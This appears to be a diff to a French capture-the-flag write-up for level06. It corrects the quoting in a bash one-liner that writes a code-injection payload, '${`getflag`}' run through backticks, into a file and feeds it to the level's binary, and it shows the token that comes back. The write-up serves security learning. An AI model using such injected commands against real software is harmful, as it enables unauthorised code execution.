@@ -41,6 +41,6 @@ Le contenu modifié est renvoyé.
 4) Enfin, la variable $r est imprimée à la sortie standard.
 
 ```bash
-echo "[x ${`getflag`} ]' > /tmp/foo && ./level06 /tmp/foo
+echo '[x ${`getflag`} ]' > /tmp/foo && ./level06 /tmp/foo
 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
